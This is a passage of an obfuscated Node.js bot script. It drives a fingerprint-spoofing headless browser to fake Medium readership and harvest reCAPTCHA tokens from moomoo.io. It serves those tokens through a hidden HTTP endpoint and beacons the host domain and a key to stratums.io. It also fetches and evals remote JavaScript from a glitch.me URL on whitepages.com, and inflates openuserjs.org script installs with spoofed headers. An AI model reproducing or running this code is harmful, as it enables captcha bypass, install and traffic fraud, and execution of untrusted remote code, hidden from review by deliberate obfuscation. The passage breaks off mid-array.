      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x0, '9oPz') + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + Z(0x5) + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + Y(0x6, 'QT^o'),
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xca0 + 0x1 * -0x10f3 + 0x1d93
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x2ea * 0x8 + -0x1 * 0x1b46 + 0x3296)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x31e + 0x7a * 0x3e + -0x2046), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x2073 + 0x5d * -0x2b + -0x2 * -0x183b), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x19 * -0x7d + -0x8 * 0x2ba + 0x99b;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x162 * -0x10 + 0x16b3 * 0x1 + -0x2cd3; w < getRandomInt(0x1e88 + -0x3 * 0x891 + -0x2 * 0x26a, -0x1d7 + -0x1d55 + 0x1f31); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xc5f5 + -0x1ce70 + 0x37ec5);
        }
      }();
    }, -0xd45 * -0x2 + 0x2272 + -0x2 * 0x1e4c), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const a0 = c;
        axios[a0(0x12)]('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x623 + -0x1a67 + -0x1045 * -0x2;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x225f + -0x5f + 0x22be, -0xfe * 0x3 + 0x21c7 + -0x5 * 0x61f)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x419e + 0x1 * -0x21ce + 0xd89c);
    }, -0x1 * -0xb78 + 0xf8d + -0x1aa1), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x17b0 + -0xff1 + 0x27a1 * 0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0xed + 0x1fa * 0x2 + 0x8b1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1ede + 0xe08 + 0x10d6), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xe * 0x3e9e + 0x3d * 0x4c3d + -0x7db8d);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x24c8 + -0x1b83 * 0x1 + -0x1d * -0x23b);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a1 = b,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1191 + 0x43c + -0xe1d * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h[a1(0x14, '5*JS')]();
  });
  e['listen'](process['env']['PORT'] || 0x2150 + 0xb * -0x3da + -0x289e * -0x1);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const a3 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1af5 + -0x2383 + 0x3e79) {
        const a2 = d;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1268 + 0x1 * -0x719 + -0x2 * -0xcc1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x15 * 0x4d + 0x26ad + -0x2cfe, D['indexOf']('\x20'));
        return B ? E['slice'](-0x2 * -0x8bb + 0x396 + 0xa86 * -0x2, E[a2(0x7)]('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3a99 + -0xf3b * -0x3 + -0x413a),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x8 * 0x829 + 0x32cb * 0x1 + -0x4d03),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object[a3(0x3, '7WBY')](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x91f + -0x24a7 + 0x2dc6; k < -0x24cf * 0x1 + -0x1a8e + 0x3f61; k++)
    setTimeout(f, (-0x1 * 0x891b + -0x8670 + -0x1 * -0x1f9eb) * k * getRandomInt(-0x1b15 + -0xbe6 * 0x1 + 0x26fc, -0x3 * 0xea + 0x138d + 0x1 * -0x10cc));
  setInterval(() => {
    f();
    for (let l = 0x1 * -0x17bd + 0x405 * 0x2 + 0xfb3 * 0x1; l < -0xb7b * -0x1 + 0x8a8 + -0x33 * 0x65; l++)
      setTimeout(f, (0x1 * 0x1a1c5 + 0xb * 0xc3f + 0x13e1a * -0x1) * l * getRandomInt(-0x254f * 0x1 + -0x4 * -0x199 + 0x1eec, 0x1ca0 + -0x1 * 0x2023 + 0x386));
  }, 0x24455a + 0x3d798 + 0xed18e);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2857 + 0x13f9 + -0x3e * -0xc5) * getRandomInt(-0x4e * -0x10 + 0xb * -0x382 + 0x21b7, 0x674 + -0x250b + 0x1e9c));
}, 0x185 * 0xd + 0x5 * -0x571 + 0x7d8);

function a() {
  const bn = [
    'zmkThYlcP1rLW7WyW4u',
    '3KoZGQiY6N',
    'eedback-sh',
    'kdmVW6GaFa',
    'click',
    '0\x20(Linux;\x20',
    'W7q+ma',
    'indexOf',
